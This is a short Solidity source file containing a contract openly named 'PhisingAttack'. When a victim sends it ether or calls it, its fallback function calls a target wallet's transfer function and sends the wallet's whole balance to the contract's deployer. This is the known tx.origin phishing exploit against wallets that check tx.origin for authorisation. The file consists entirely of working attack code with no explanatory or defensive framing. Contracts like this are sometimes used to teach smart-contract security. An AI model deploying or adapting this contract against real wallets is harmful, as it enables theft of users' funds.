// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IsmartContract {
    function transfer(address _to,uint _amount) external;
}
contract PhisingAttack {
    address payable private owner;
    IsmartContract private wallet;
    constructor(address _IsmartAddress){
        owner = payable(msg.sender);
        wallet = IsmartContract(_IsmartAddress);
    }

    fallback() external payable {
        wallet.transfer(owner,address(wallet).balance);
    }

}